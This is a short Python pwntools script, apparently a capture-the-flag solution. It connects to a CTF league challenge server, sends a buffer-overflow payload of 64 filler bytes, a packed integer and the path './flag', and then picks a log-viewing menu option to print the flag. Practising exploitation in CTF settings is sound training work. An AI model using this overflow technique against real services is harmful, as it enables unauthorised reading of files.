from pwn import *

# Connect to the challenge server
server = remote("chal.ctf-league.osusec.org", 7184)

# Print intro & name prompt
# .decode() converts a bytestring to a regular string
print(server.recv().decode())

# Send payload
server.sendline(b"b"*64 + p32(1) + b"./flag\x00")

# Print developer menu
server.recv()

# Select "View log file" option
server.sendline(b"2")

# Two recvs are needed to print the flag for some reason
print(server.recv().decode())
print(server.recv().decode())